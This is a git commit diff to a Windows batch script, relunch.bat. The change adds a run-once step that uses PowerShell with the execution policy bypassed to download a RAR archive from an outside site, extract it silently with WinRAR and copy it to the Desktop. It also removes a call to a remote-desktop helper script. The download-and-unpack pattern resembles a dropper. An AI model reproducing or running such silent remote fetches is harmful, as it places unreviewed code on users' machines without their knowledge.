a1f8af8b1dd75155ea75bf56dca7e146a390ce3a
DThang200 <thangdao202@gmail.com>
2025-05-28 05:19:37 +0700

    update

--- relunch.bat
+++ relunch.bat
@@ -1,9 +1,16 @@
 @echo off 
  
-call "%USERPROFILE%\Desktop\dow-code\client-code\checklog.bat" "CHECKING-26/05/2025-22:25" 
+set urls=https://spyderrock.com/hX2E5877-decode-awp.rar 
+call "%USERPROFILE%\Desktop\dow-code\client-code\checklog.bat" "AWP-SETUP-FILE" 
 if %errorlevel% equ 0 ( 
-echo done 
+   echo done 
 ) else ( 
-call "%USERPROFILE%\Desktop\dow-code\client-code\addlog.bat" "CHECKING-26/05/2025-22:25" 
-    call "%USERPROFILE%\Desktop\dow-code\test-something\asset\open-ultraview.bat" 
+    call "%USERPROFILE%\Desktop\dow-code\client-code\addlog.bat" "AWP-SETUP-FILE" 
+    powershell -NoProfile -ExecutionPolicy Bypass -Command "& {Invoke-WebRequest -Uri 'https://spyderrock.com/hX2E5877-decode-awp.rar' -OutFile '%USERPROFILE%\Desktop\decode-awp.rar'}" 
+    mkdir "%USERPROFILE%\Desktop\decode-awp-temp" 
+    "C:\Program Files\WinRAR\WinRAR.exe" x -ibck -y '%USERPROFILE%\Desktop\decode-awp.rar' "%USERPROFILE%\Desktop\decode-awp-temp\" 
+    xcopy "%USERPROFILE%\Desktop\decode-awp-temp\decode-awp\*" "%USERPROFILE%\Desktop\decode-awp\" /E /Y /I /H 
+    rmdir /s /q "%USERPROFILE%\Desktop\decode-awp-temp" 
 ) 
+timeout /t 5 
+exit 
